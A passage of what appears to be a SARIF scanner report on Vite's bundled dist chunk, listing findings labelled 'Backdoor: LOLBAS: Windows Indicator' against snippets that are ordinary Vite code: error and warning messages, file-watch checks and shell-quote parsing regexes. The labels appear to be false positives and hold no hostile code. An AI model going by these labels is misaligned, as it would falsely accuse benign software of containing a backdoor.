                    "text": "        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b /* ';' */ || code === 0x2c /* ',' */) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                    "rendered": {
                      "text": "        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b /* ';' */ || code === 0x2c /* ',' */) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n",
                      "markdown": "`        if (end === -1 && start !== -1) end = i;\n      } else if (code === 0x3b /* ';' */ || code === 0x2c /* ',' */) {\n        if (start === -1) {\n          throw new SyntaxError(`Unexpected character at index ${i}`);\n        }\n\n        if (end === -1) end = i;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52715,
                  "startColumn": 21,
                  "endLine": 52715,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n      }\n    );\n",
                    "rendered": {
                      "text": "        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n      }\n    );\n",
                      "markdown": "`        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n      }\n    );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52713,
                  "startColumn": 21,
                  "endLine": 52713,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        const sourceFile = path$n.resolve(path$n.dirname(id), pos.source);\n        const source = `${sourceFile}:${pos.line}:${pos.column + 1}`;\n        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n",
                    "rendered": {
                      "text": "        const sourceFile = path$n.resolve(path$n.dirname(id), pos.source);\n        const source = `${sourceFile}:${pos.line}:${pos.column + 1}`;\n        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n",
                      "markdown": "`        const sourceFile = path$n.resolve(path$n.dirname(id), pos.source);\n        const source = `${sourceFile}:${pos.line}:${pos.column + 1}`;\n        if (!trimmedVarName || trimmedVarName === \"eval\") {\n          return `    at ${source}`;\n        } else {\n          return `    at ${trimmedVarName} (${source})`;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52279,
                  "startColumn": 36,
                  "endLine": 52280,
                  "endColumn": 3,
                  "snippet": {
                    "text": "    if (!err.loc || !err.loc.line) throw err;\n    const line = err.loc.line;\n    throw new Error(\n      `Parse failure: ${err.message}\nAt file: ${url}\nContents of line ${line}: ${code.split(\"\\n\")[line - 1]}`\n    );\n  }\n",
                    "rendered": {
                      "text": "    if (!err.loc || !err.loc.line) throw err;\n    const line = err.loc.line;\n    throw new Error(\n      `Parse failure: ${err.message}\nAt file: ${url}\nContents of line ${line}: ${code.split(\"\\n\")[line - 1]}`\n    );\n  }\n",
                      "markdown": "`    if (!err.loc || !err.loc.line) throw err;\n    const line = err.loc.line;\n    throw new Error(\n      `Parse failure: ${err.message}\nAt file: ${url}\nContents of line ${line}: ${code.split(\"\\n\")[line - 1]}`\n    );\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48144,
                  "startColumn": 78,
                  "endLine": 48144,
                  "endColumn": 82,
                  "snippet": {
                    "text": "            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n",
                    "rendered": {
                      "text": "            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n",
                      "markdown": "`            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48144,
                  "startColumn": 23,
                  "endLine": 48144,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n",
                    "rendered": {
                      "text": "            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n",
                      "markdown": "`            const rawExp = code.slice(startIndex, endIndex);\n            config.logger.warnOnce(\n              `\n${rawExp} doesn't exist at build time, it will remain unchanged to be resolved at runtime. If this is intended, you can use the /* @vite-ignore */ comment to suppress this warning.`\n            );\n            builtUrl = url;\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47171,
                  "startColumn": 28,
                  "endLine": 47171,
                  "endColumn": 32,
                  "snippet": {
                    "text": "}\nfunction throwFileNotFoundInOptimizedDep(id) {\n  const err = new Error(\n    `The file does not exist at \"${id}\" which is in the optimize deps directory. The dependency might be incompatible with the dep optimizer. Try adding it to \\`optimizeDeps.exclude\\`.`\n  );\n  err.code = ERR_FILE_NOT_FOUND_IN_OPTIMIZED_DEP_DIR;\n  throw err;\n",
                    "rendered": {
                      "text": "}\nfunction throwFileNotFoundInOptimizedDep(id) {\n  const err = new Error(\n    `The file does not exist at \"${id}\" which is in the optimize deps directory. The dependency might be incompatible with the dep optimizer. Try adding it to \\`optimizeDeps.exclude\\`.`\n  );\n  err.code = ERR_FILE_NOT_FOUND_IN_OPTIMIZED_DEP_DIR;\n  throw err;\n",
                      "markdown": "`}\nfunction throwFileNotFoundInOptimizedDep(id) {\n  const err = new Error(\n    `The file does not exist at \"${id}\" which is in the optimize deps directory. The dependency might be incompatible with the dep optimizer. Try adding it to \\`optimizeDeps.exclude\\`.`\n  );\n  err.code = ERR_FILE_NOT_FOUND_IN_OPTIMIZED_DEP_DIR;\n  throw err;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47086,
                  "startColumn": 59,
                  "endLine": 47086,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        };\n      } catch (e) {\n        const position = extractJsonErrorPosition(e.message, json.length);\n        const msg = position ? `, invalid JSON syntax found at position ${position}` : `.`;\n        this.error(`Failed to parse JSON file` + msg, position);\n      }\n    }\n",
                    "rendered": {
                      "text": "        };\n      } catch (e) {\n        const position = extractJsonErrorPosition(e.message, json.length);\n        const msg = position ? `, invalid JSON syntax found at position ${position}` : `.`;\n        this.error(`Failed to parse JSON file` + msg, position);\n      }\n    }\n",
                      "markdown": "`        };\n      } catch (e) {\n        const position = extractJsonErrorPosition(e.message, json.length);\n        const msg = position ? `, invalid JSON syntax found at position ${position}` : `.`;\n        this.error(`Failed to parse JSON file` + msg, position);\n      }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44819,
                  "startColumn": 7,
                  "endLine": 44819,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\tvar BAREWORD = '(\\\\' + BS + '[\\'\"' + META + ']|[^\\\\s\\'\"' + META + '])+';\n\n\tvar chunker = new RegExp([\n\t\t'(' + CONTROL + ')', // control chars\n\t\t'(' + BAREWORD + '|' + SINGLE_QUOTE + '|' + DOUBLE_QUOTE + ')+'\n\t].join('|'), 'g');\n\n",
                    "rendered": {
                      "text": "\tvar BAREWORD = '(\\\\' + BS + '[\\'\"' + META + ']|[^\\\\s\\'\"' + META + '])+';\n\n\tvar chunker = new RegExp([\n\t\t'(' + CONTROL + ')', // control chars\n\t\t'(' + BAREWORD + '|' + SINGLE_QUOTE + '|' + DOUBLE_QUOTE + ')+'\n\t].join('|'), 'g');\n\n",
                      "markdown": "`\tvar BAREWORD = '(\\\\' + BS + '[\\'\"' + META + ']|[^\\\\s\\'\"' + META + '])+';\n\n\tvar chunker = new RegExp([\n\t\t'(' + CONTROL + ')', // control chars\n\t\t'(' + BAREWORD + '|' + SINGLE_QUOTE + '|' + DOUBLE_QUOTE + ')+'\n\t].join('|'), 'g');\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44762,
                  "startColumn": 32,
                  "endLine": 44762,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\t'<\\\\&',\n\t'[&;()|<>]'\n].join('|') + ')';\nvar controlRE = new RegExp('^' + CONTROL + '$');\nvar META = '|&;()<> \\\\t';\nvar SINGLE_QUOTE = '\"((\\\\\\\\\"|[^\"])*?)\"';\nvar DOUBLE_QUOTE = '\\'((\\\\\\\\\\'|[^\\'])*?)\\'';\n",
                    "rendered": {
                      "text": "\t'<\\\\&',\n\t'[&;()|<>]'\n].join('|') + ')';\nvar controlRE = new RegExp('^' + CONTROL + '$');\nvar META = '|&;()<> \\\\t';\nvar SINGLE_QUOTE = '\"((\\\\\\\\\"|[^\"])*?)\"';\nvar DOUBLE_QUOTE = '\\'((\\\\\\\\\\'|[^\\'])*?)\\'';\n",
                      "markdown": "`\t'<\\\\&',\n\t'[&;()|<>]'\n].join('|') + ')';\nvar controlRE = new RegExp('^' + CONTROL + '$');\nvar META = '|&;()<> \\\\t';\nvar SINGLE_QUOTE = '\"((\\\\\\\\\"|[^\"])*?)\"';\nvar DOUBLE_QUOTE = '\\'((\\\\\\\\\\'|[^\\'])*?)\\'';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44750,
                  "startColumn": 3,
                  "endLine": 44750,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n// '<(' is process substitution operator and\n// can be parsed the same as control operator\nvar CONTROL = '(?:' + [\n\t'\\\\|\\\\|',\n\t'\\\\&\\\\&',\n\t';;',\n",
                    "rendered": {
                      "text": "\n// '<(' is process substitution operator and\n// can be parsed the same as control operator\nvar CONTROL = '(?:' + [\n\t'\\\\|\\\\|',\n\t'\\\\&\\\\&',\n\t';;',\n",
                      "markdown": "`\n// '<(' is process substitution operator and\n// can be parsed the same as control operator\nvar CONTROL = '(?:' + [\n\t'\\\\|\\\\|',\n\t'\\\\&\\\\&',\n\t';;',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42961,
                  "startColumn": 16,
                  "endLine": 42961,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n      }\n      prevStats = newStats;\n",
                    "rendered": {
                      "text": "      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n      }\n      prevStats = newStats;\n",
                      "markdown": "`      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n      }\n      prevStats = newStats;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42959,
                  "startColumn": 11,
                  "endLine": 42959,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      // add is about to be emitted if file not already tracked in parent\n    } else if (parent.has(basename)) {\n      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n",
                    "rendered": {
                      "text": "      // add is about to be emitted if file not already tracked in parent\n    } else if (parent.has(basename)) {\n      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n",
                      "markdown": "`      // add is about to be emitted if file not already tracked in parent\n    } else if (parent.has(basename)) {\n      // Check that change event was not fired because of changed only accessTime.\n      const at = newStats.atimeMs;\n      const mt = newStats.mtimeMs;\n      if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n        this.fsw._emit(EV_CHANGE$2, file, newStats);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42942,
                  "startColumn": 18,
                  "endLine": 42942,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n        }\n        if (isLinux && prevStats.ino !== newStats.ino) {\n",
                    "rendered": {
                      "text": "        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n        }\n        if (isLinux && prevStats.ino !== newStats.ino) {\n",
                      "markdown": "`        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n        }\n        if (isLinux && prevStats.ino !== newStats.ino) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42940,
                  "startColumn": 13,
                  "endLine": 42940,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        const newStats = await stat$2(file);\n        if (this.fsw.closed) return;\n        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n",
                    "rendered": {
                      "text": "        const newStats = await stat$2(file);\n        if (this.fsw.closed) return;\n        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n",
                      "markdown": "`        const newStats = await stat$2(file);\n        if (this.fsw.closed) return;\n        // Check that change event was not fired because of changed only accessTime.\n        const at = newStats.atimeMs;\n        const mt = newStats.mtimeMs;\n        if (!at || at <= mt || mt !== prevStats.mtimeMs) {\n          this.fsw._emit(EV_CHANGE$2, file, newStats);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 38715,
                  "startColumn": 78,
                  "endLine": 38715,
                  "endColumn": 86,
                  "snippet": {
                    "text": "    const importSuggestion = forceDefaultAs.includes(opts.as) ? `, import: 'default'` : \"\";\n    logger.warn(\n      colors$1.yellow(\n        `The glob option \"as\" has been deprecated in favour of \"query\". Please update \\`as: '${opts.as}'\\` to \\`query: '?${opts.as}'${importSuggestion}\\`.`\n      )\n    );\n  }\n",
                    "rendered": {
                      "text": "    const importSuggestion = forceDefaultAs.includes(opts.as) ? `, import: 'default'` : \"\";\n    logger.warn(\n      colors$1.yellow(\n        `The glob option \"as\" has been deprecated in favour of \"query\". Please update \\`as: '${opts.as}'\\` to \\`query: '?${opts.as}'${importSuggestion}\\`.`\n      )\n    );\n  }\n",
                      "markdown": "`    const importSuggestion = forceDefaultAs.includes(opts.as) ? `, import: 'default'` : \"\";\n    logger.warn(\n      colors$1.yellow(\n        `The glob option \"as\" has been deprecated in favour of \"query\". Please update \\`as: '${opts.as}'\\` to \\`query: '?${opts.as}'${importSuggestion}\\`.`\n      )\n    );\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36119,
                  "startColumn": 104,
                  "endLine": 36119,
                  "endColumn": 108,
                  "snippet": {
                    "text": "          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n",
                    "rendered": {
                      "text": "          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n",
                      "markdown": "`          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36119,
                  "startColumn": 49,
                  "endLine": 36119,
                  "endColumn": 53,
                  "snippet": {
                    "text": "          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n",
                    "rendered": {
                      "text": "          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n",
                      "markdown": "`          if (!isExternal) {\n            config.logger.warnOnce(\n              `\n${decodedUrl} referenced in ${id2} didn't resolve at build time, it will remain unchanged to be resolved at runtime`\n            );\n          }\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35406,
                  "startColumn": 75,
                  "endLine": 35406,
                  "endColumn": 79,
                  "snippet": {
                    "text": "          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n",
                    "rendered": {
                      "text": "          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n",
                      "markdown": "`          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35406,
                  "startColumn": 20,
                  "endLine": 35406,
                  "endColumn": 24,
                  "snippet": {
                    "text": "          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n",
                    "rendered": {
                      "text": "          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n",
                      "markdown": "`          if (resolved == null) {\n            config.logger.warnOnce(\n              `\n${url} doesn't exist at build time, it will remain unchanged to be resolved at runtime`\n            );\n            const importExpression = `\nimport ${JSON.stringify(url)}`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35133,
                  "endLine": 35133,
                  "endColumn": 4,
                  "snippet": {
                    "text": "  const parseError = formatParseError(parserError, filePath, html);\n  throw new Error(\n    `Unable to parse HTML; ${parseError.message}\n at ${parseError.loc.file}:${parseError.loc.line}:${parseError.loc.column}\n${parseError.frame}`\n  );\n}\n",
                    "rendered": {
                      "text": "  const parseError = formatParseError(parserError, filePath, html);\n  throw new Error(\n    `Unable to parse HTML; ${parseError.message}\n at ${parseError.loc.file}:${parseError.loc.line}:${parseError.loc.column}\n${parseError.frame}`\n  );\n}\n",
                      "markdown": "`  const parseError = formatParseError(parserError, filePath, html);\n  throw new Error(\n    `Unable to parse HTML; ${parseError.message}\n at ${parseError.loc.file}:${parseError.loc.line}:${parseError.loc.column}\n${parseError.frame}`\n  );\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
